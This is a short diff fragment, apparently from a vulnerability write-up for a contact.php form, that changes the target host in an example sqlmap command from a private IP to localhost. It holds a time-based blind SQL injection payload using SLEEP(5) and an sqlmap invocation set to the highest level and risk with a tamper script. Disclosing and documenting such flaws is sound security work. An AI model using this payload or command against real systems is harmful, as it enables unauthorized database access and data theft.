@@ -44,7 +44,7 @@ Payload: title=111' AND (SELECT 6044 FROM (SELECT(SLEEP(5)))Utkc) AND 'otMP'='ot
 
 **Example sqlmap Command**:
 ```bash
-sqlmap -u "10.211.55.6:1144/contact.php" \
+sqlmap -u "localhost:2309/contact.php" \
        --data="title=111&message=1111&submit=" \
        --batch --level=5 --risk=3 \
        --random-agent --tamper=space2comment
